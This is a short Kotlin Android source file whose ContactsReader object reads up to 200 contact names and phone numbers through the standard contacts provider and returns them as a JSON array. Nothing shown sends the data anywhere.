package com.misfit.gawdzilla

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object ContactsReader {
    fun collect(ctx: Context, limit: Int = 200): JSONArray {
        val arr = JSONArray()
        try {
            val cur = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, "display_name ASC"
            ) ?: return arr
            var n = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    val o = JSONObject()
                    o.put("name",   it.getString(0) ?: "")
                    o.put("number", it.getString(1) ?: "")
                    arr.put(o)
                    n++
                }
            }
        } catch (_: Exception) {}
        return arr
    }
}
